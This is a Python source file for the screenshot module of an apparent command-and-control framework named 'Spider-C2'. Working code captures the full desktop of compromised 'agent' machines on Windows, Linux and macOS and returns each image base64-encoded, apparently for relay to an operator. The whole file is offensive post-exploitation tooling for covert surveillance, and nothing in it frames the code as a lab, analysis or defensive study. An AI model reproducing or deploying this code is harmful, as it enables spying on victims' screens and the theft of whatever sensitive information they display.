"""
Spider-C2 Module : Screenshot
Capture screenshots on agent systems.
"""

import os
import platform
import base64
from datetime import datetime

class ScreenshotModule:
    def __init__(self):
        self.os_type = platform.system()

    def capture(self):
        if self.os_type == "Windows":
            return self._capture_windows()
        elif self.os_type == "Linux":
            return self._capture_linux()
        elif self.os_type == "Darwin":
            return self._capture_mac()
        return "[!] Unsupported OS"

    def _capture_windows(self):
        try:
            import win32gui
            import win32ui
            import win32con
            from PIL import Image

            hwnd = win32gui.GetDesktopWindow()
            left, top, right, bottom = win32gui.GetWindowRect(hwnd)
            width = right - left
            height = bottom - top

            hdc = win32gui.GetWindowDC(hwnd)
            mfc_dc = win32ui.CreateDCFromHandle(hdc)
            save_dc = mfc_dc.CreateCompatibleDC()
            bitmap = win32ui.CreateBitmap()
            bitmap.CreateCompatibleBitmap(mfc_dc, width, height)
            save_dc.SelectObject(bitmap)
            save_dc.BitBlt((0, 0), (width, height), mfc_dc, (0, 0), win32con.SRCCOPY)

            bmp_info = bitmap.GetInfo()
            bmp_str = bitmap.GetBitmapBits(True)
            img = Image.frombuffer("RGB", (bmp_info["bmWidth"], bmp_info["bmHeight"]), bmp_str, "raw", "BGRX", 0, 1)

            filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            img.save(filename)

            win32gui.DeleteObject(bitmap.GetHandle())
            save_dc.DeleteDC()
            mfc_dc.DeleteDC()
            win32gui.ReleaseDC(hwnd, hdc)

            with open(filename, "rb") as f:
                return base64.b64encode(f.read()).decode()
        except ImportError:
            return "[!] Install pywin32 and Pillow"
        except Exception as e:
            return f"[!] Screenshot failed: {e}"

    def _capture_linux(self):
        try:
            import subprocess
            filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            subprocess.run(["import", "-window", "root", filename], capture_output=True)
            if os.path.exists(filename):
                with open(filename, "rb") as f:
                    return base64.b64encode(f.read()).decode()
            return "[!] ImageMagick not installed"
        except:
            return "[!] Linux screenshot failed"

    def _capture_mac(self):
        try:
            import subprocess
            filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            subprocess.run(["screencapture", filename], capture_output=True)
            if os.path.exists(filename):
                with open(filename, "rb") as f:
                    return base64.b64encode(f.read()).decode()
            return "[!] Screencapture failed"
        except:
            return "[!] Mac screenshot failed"
